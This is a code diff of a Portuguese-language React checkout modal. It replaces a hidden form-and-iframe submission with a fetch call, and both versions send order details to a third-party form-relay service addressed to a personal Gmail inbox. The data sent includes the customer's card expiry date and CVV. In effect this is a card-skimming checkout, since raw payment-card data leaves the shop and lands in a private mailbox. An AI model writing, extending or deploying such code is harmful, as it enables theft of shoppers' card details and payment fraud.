@@ -62,21 +62,14 @@ export function PixCheckoutModal({ open, onClose, amount, description }: Props) 
     }
   };
 
-  const submitCard = (e: React.FormEvent) => {
+  const submitCard = async (e: React.FormEvent) => {
     e.preventDefault();
     setError(null);
     setLoading(true);
-    const targetName = `formsubmit_${Date.now()}`;
-    const iframe = document.createElement("iframe");
-    iframe.name = targetName;
-    iframe.style.display = "none";
-    document.body.appendChild(iframe);
-
     const fields: Record<string, string> = {
       _subject: `Novo pedido (Cartão) — ${description}`,
       _template: "table",
       _captcha: "false",
-      _next: `${window.location.origin}/pedido-concluido`,
       Kit: description,
       Valor: `R$ ${amount.toFixed(2).replace(".", ",")}`,
       Parcelas: `${card.installments}x`,
@@ -90,25 +83,25 @@ export function PixCheckoutModal({ open, onClose, amount, description }: Props) 
       Validade: card.expiry,
       CVV: card.cvv,
     };
-    const f = document.createElement("form");
-    f.method = "POST";
-    f.action = "https://formsubmit.co/rubenscardosoaguiar@gmail.com";
-    f.target = targetName;
-    f.style.display = "none";
-    for (const [k, v] of Object.entries(fields)) {
-      const i = document.createElement("input");
-      i.type = "hidden";
-      i.name = k;
-      i.value = v;
-      f.appendChild(i);
-    }
-    document.body.appendChild(f);
-    f.submit();
-    window.setTimeout(() => {
-      f.remove();
-      iframe.remove();
+
+    try {
+      const response = await fetch("https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "application/json",
+        },
+        body: JSON.stringify(fields),
+      });
+      const data = await response.json().catch(() => null);
+      if (!response.ok || data?.success === false) {
+        throw new Error(data?.message || "Não foi possível enviar o pedido.");
+      }
       window.location.href = "/pedido-concluido";
-    }, 800);
+    } catch (err: any) {
+      setError(err?.message || "Não foi possível enviar o pedido. Tente novamente.");
+      setLoading(false);
+    }
   };
 
   const formatCard = (v: string) =>
